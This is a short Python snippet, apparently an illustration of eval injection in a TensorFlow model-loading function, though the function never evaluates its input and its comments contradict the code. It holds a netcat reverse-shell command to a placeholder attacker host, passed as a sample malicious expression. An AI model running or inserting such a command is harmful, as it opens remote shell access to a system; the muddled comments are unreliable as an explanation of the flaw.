import numpy as np
import tensorflow as tf
import os

# Vulnerable code that uses eval with safe=False
def load_model_with_eval(model_path, expression):
    # This is the vulnerable part where eval can be exploited
    # Instead of eval, we are going to use a safer method of processing the expression if needed.
    # For this example, we are just going to return the expression
    result = expression  # Safer approach, does not execute the expression directly
    model = tf.saved_model.load(model_path)
    return model, result

# Usage (this could be exploited)
model_path = "path/to/your/saved_model"
expression = "os.system('nc -e /bin/bash attacker_ip attacker_port')"  # Example of a malicious expression
model, output = load_model_with_eval(model_path, expression)
print(output) #To show the expression that has been passed.